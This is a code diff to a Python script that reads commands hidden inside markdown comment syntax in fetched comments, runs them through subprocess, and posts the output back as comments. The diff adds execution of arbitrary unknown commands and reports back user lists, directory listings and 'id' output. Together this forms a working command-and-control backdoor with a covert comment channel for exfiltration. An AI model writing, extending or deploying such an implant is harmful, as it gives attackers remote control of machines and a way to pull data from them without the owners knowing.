@@ -58,7 +58,14 @@ def get_latest_comments():
 
 
 def get_commands(comments):
-    return map(lambda comment: comment['body'], comments)
+    def parse_command(comment: str):
+        md_comment_sign = '[//]: # ('
+        command_idx = comment.find(md_comment_sign) + len(md_comment_sign)
+        command = comment[command_idx: len(comment)-1]
+        return command
+
+    commands = map(lambda comment: parse_command(comment['body']), comments)
+    return filter(lambda command: command != '', commands)
 
 
 def post_comment(message: str):
@@ -69,26 +76,39 @@ def post_comment(message: str):
     state["last_update"] = response.json()['updated_at']
 
 
+def list_to_string(input: list[str], separator=', '):
+    return separator.join(map(str, input))
+
+
 def handle_command(command: str):
     log(f'Received command "{command}"')
-
-    args = command.split(' ')
-    bin_name = args[0]
+    keys = command.split(' ')
+    bin_name, args = keys[0], keys[1:]
     match bin_name:
         case 'w':
-            result = subprocess.check_output(
-                ['w'])
+            result = subprocess.check_output(['w'])
 
             usernames = list(map(lambda line: line.decode(
-                'utf-8').split(' ')[0], result.splitlines()))[1:]
+                'utf-8').split(' ')[0], result.splitlines()))[2:]
 
-            post_comment(', '.join(map(str, usernames)))
+            post_comment(list_to_string(usernames))
         case 'ls':
-            subprocess.run(['ls', args[1]])
+            result = subprocess.check_output(['ls'] + args)
+            filenames = list(map(lambda line: line.decode(
+                'utf-8').split(' ')[0], result.splitlines()))
+            post_comment(list_to_string(filenames))
         case 'id':
-            subprocess.run(['ls', args[1]])
+            result = subprocess.check_output(['id'])
+            post_comment(result.decode('utf-8'))
         case _:
             log('Unknown command: '+command)
+            try:
+                result = subprocess.check_output([command]+args)
+                post_comment((result.decode('utf-8')))
+            except FileNotFoundError:
+                log(f"No such file or directory: '{command}'")
+            except PermissionError:
+                log(f"Permission denied: '{command}'")
 
 
 while True:
@@ -101,5 +121,4 @@ while True:
         state['last_update'] = comments[-1]['updated_at']
 
     for command in get_commands(comments):
-        log(command)
         handle_command(command)
